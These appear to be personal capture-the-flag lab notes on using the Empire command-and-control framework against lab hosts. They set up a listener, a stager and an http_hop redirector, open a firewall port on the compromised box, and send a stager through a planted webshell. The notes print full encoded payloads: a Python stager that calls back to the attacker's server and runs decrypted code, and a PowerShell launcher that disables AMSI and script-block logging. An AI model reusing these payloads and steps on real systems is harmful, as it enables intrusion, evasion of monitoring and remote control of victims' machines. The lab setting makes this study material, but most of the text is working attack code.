### set up *listener*

`uselistener http`

We then set our options for the listener

```
set Name Webserver
set Host 10.50.101.131
set Port 8000
```

Now we can run the listener with `execute` and go `back`

---

### set up *stager*

`usestager multi/bash`

set listener to the one we created earlier
`set Listener Webserver`

`execute` again

---

### combine the *listener* and *stager* into an *agent*

We log back into the .200 box first as root, then we run the following command:

```bash
echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCm91dCwgZXJyID0gcHMuY29tbXVuaWNhdGUoKQppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliLnJlcXVlc3Q7ClVBPSdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbyc7c2VydmVyPSdodHRwOi8vMTAuNTAuMTAxLjEzMTo4MDAwJzt0PScvbmV3cy5waHAnO3JlcT11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHNlcnZlcit0KTsKcHJveHkgPSB1cmxsaWIucmVxdWVzdC5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYi5yZXF1ZXN0LmJ1aWxkX29wZW5lcihwcm94eSk7Cm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JyxVQSksICgiQ29va2llIiwgInNlc3Npb249K3Nud0l3b1pWb2NXOVpuaCtjR3FKRU5BdjRzPSIpXTsKdXJsbGliLnJlcXVlc3QuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc1SXZMZypDQlp9XWJoUlkvN0VkY1t+TShfIztqTm0hLCcuZW5jb2RlKCdVVEYtOCcpO1MsaixvdXQ9bGlzdChyYW5nZSgyNTYpKSwwLFtdCmZvciBpIGluIGxpc3QocmFuZ2UoMjU2KSk6CiAgICBqPShqK1NbaV0ra2V5W2klbGVuKGtleSldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIoY2hhcl5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSk='));" | python3 &
```

This will result in an agent being received on our waiting listener in Empire. We can then type `agents` to view

We interact with the agent with `interact AGENTNAME`

(we can kill the agent with `kill AGENTNAME` or rename it with `rename AGENTNAME NEWNAME`)

---

### Proxying Empire agents

We will want to `uselistener http_hop`

Set the following
```
set RedirectListener Webserver
set Host 10.200.100.200
set Port 47000
```

---

Now we generate a new stager

`usestager multi/launcher`
`set Listener http_hop`
`execute`

This saves to **/tmp/http_hop** on our attack box
We need to now get these files onto the compromised box.

```
cd /tmp/http_hop
zip -r hop.zip *
python3 -m http.server 80
```

curl to /tmp directory on compromised box

---

Now we need to server the files on the http_hop listener port
We know the machine has php. We can create a php webserver to serve the files.

`php -S 0.0.0.0:47000 &>/dev/null &`

**DON'T FORGET TO OPEN FIREWALL PORT ON COMPROMISED BOX**

``firewall-cmd --zone=public --add-port 47000/tcp``


---

We now  use the webshell we had in burpsuite to pass the stager command:

```POST
POST /web/exploit-k.php HTTP/1.1
Host: gitserver.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=8fIXpM3hjzaS9K5qdiztvTjrY2CW2DFA; sessionid=7c7f16ab0abe63010d960ed76f54b6e8
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 5102

a=powershell+-noP+-sta+-w+1+-enc++SQBmACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAYgBMAEUALgBQAFMAVgBlAFIAUwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJAA2AGMAZQAwAD0AWwByAGUAZgBdAC4AQQBzAFMARQBtAGIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAYwBlADAAKQB7ACQAOABGAEIAYQA9ACQANgBjAEUAMAAuAEcARQB0AFYAYQBsAHUARQAoACQAbgB1AEwAbAApADsASQBmACgAJAA4AEYAYgBBAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAOABmAGIAYQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA4AEYAQgBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwAZQBDAFQAaQBPAG4AUwAuAEcAZQBOAEUAcgBJAEMALgBEAEkAYwBUAGkATwBuAEEAcgB5AFsAUwB0AHIASQBuAEcALABTAHkAUwB0AGUATQAuAE8AYgBKAGUAYwB0AF0AXQA6ADoATgBlAFcAKAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADgAZgBCAEEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAGwAfQBFAGwAcwBFAHsAWwBTAGMAUgBpAHAAdABCAGwAbwBDAEsAXQAuACIARwBlAHQARgBpAGUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAHUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIAagBlAGMAdAAgAEMAbwBsAEwAZQBjAFQASQBvAG4AcwAuAEcARQBOAGUAcgBJAEMALgBIAGEAcwBoAFMAZQB0AFsAUwBUAFIASQBuAEcAXQApACkAfQAkAFIARQBGAD0AWwBSAGUARgBdAC4AQQBTAFMARQBtAGIATABZAC4ARwBFAFQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAGUAdABGAGkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBMAFUAZQAoACQAbgBVAEwATAAsACQAdAByAFUARQApADsAfQA7AFsAUwBZAFMAVABlAG0ALgBOAGUAdAAuAFMAZQByAHYASQBjAGUAUABPAGkAbgB0AE0AQQBuAEEARwBlAHIAXQA6ADoARQBYAHAAZQBDAFQAMQAwADAAQwBPAE4AVABJAE4AVQBFAD0AMAA7ACQAYQBlAEYAQgA9AE4ARQBXAC0ATwBCAGoAZQBDAFQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABBAGUARgBiAC4ASABlAGEARABFAFIAUwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAYQBlAEYAQgAuAFAAcgBvAHgAWQA9AFsAUwBZAHMAdABlAE0ALgBOAGUAdAAuAFcARQBiAFIAZQBxAHUAZQBTAHQAXQA6ADoARABFAGYAQQB1AGwAdABXAEUAQgBQAHIATwBYAHkAOwAkAGEAZQBGAEIALgBQAHIATwBYAHkALgBDAFIARQBkAEUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAFkAcwB0AEUATQAuAE4AZQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAYwBIAEUAXQA6ADoARABlAEYAQQBVAGwAVABOAEUAVABXAE8AUgBLAEMAUgBFAGQAZQBOAHQASQBhAEwAUwA7ACQASwA9AFsAUwBZAFMAdABFAG0ALgBUAEUAWAB0AC4ARQBuAGMATwBkAGkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAWQB0AEUAcwAoACcANQBJAHYATABnACoAQwBCAFoAfQBdAGIAaABSAFkALwA3AEUAZABjAFsAfgBNACgAXwAjADsAagBOAG0AIQAsACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAQQBFAEYAQgAuAEgARQBhAEQARQByAHMALgBBAEQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AGEASQA2AGcAdABYAGEAQQBVADgAYwBVAEsANwBtAEUAQwB5AFAARwBSACsAOABUAHMAWQBFAD0AIgApADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAE4AQwBPAEQAaQBOAEcAXQA6ADoAVQBuAGkAYwBPAGQARQAuAEcARQB0AFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAUgBUAF0AOgA6AEYAUgBvAE0AQgBhAHMAZQA2ADQAUwBUAHIAaQBuAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHkAQQBEAEEAQQBNAEEAQQB1AEEARABFAEEATQBBAEEAdwBBAEMANABBAE0AZwBBAHcAQQBEAEEAQQBPAGcAQQAwAEEARABjAEEATQBBAEEAdwBBAEQAQQBBACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkAGgAbwBwAD0AJwBoAHQAdABwAF8AaABvAHAAJwA7ACQAZABhAHQAYQA9ACQAQQBFAEYAQgAuAEQAbwB3AE4ATABPAEEARABEAGEAdABhACgAJABzAGUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AEEAPQAkAGQAYQBUAGEAWwA0AC4ALgAkAEQAQQB0AGEALgBMAGUAbgBnAHQASABdADsALQBKAG8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA%3d%3d```

